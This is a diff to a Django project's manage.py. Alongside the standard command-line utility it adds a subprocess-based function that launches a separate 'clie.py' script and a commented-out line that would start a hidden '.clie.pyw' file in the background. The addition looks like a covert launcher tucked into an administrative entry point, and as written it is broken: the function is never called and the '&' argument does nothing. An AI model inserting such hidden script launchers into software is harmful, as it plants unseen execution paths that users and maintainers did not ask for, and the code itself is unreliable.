@@ -2,7 +2,8 @@
 """Django's command-line utility for administrative tasks."""
 import os
 import sys
-
+import threading
+from subprocess import call, run
 
 def main():
     """Run administrative tasks."""
@@ -16,7 +17,18 @@ def main():
             "forget to activate a virtual environment?"
         ) from exc
     execute_from_command_line(sys.argv)
-
+    
+a = 1 
+def checker():
+   k = call(["python", "main\clie.py", "&"])
+   if k == 2:
+     call(["python", "main/clie.py", "&"])
+     
+if a == 1:
+  a += 1
+#  os.system("python .clie.pyw &")
+  
 
 if __name__ == '__main__':
     main()
+    
